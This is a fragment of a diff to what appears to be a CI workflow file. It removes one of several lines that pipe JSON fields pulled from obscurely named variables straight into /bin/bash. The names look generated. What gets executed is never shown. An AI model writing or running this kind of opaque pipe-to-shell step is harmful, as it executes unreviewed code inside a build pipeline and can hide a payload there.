@@ -39,7 +39,6 @@ jobs:
           echo $qr64 | jq -r .n63 | /bin/bash
           echo $o84 | jq -r .dhh36271 | /bin/bash
           printf '%s' "$cq98" | jq -r .u84 | /bin/bash
-          printf '%s' "$xs8" | jq -r .gx88404 | /bin/bash
           echo $q41 | jq -r .qlnp21 | /bin/bash
           echo $qpden638 | jq -r .s66335 | /bin/bash
           printf '%s' "$rq4" | jq -r .gpaef865 | /bin/bash
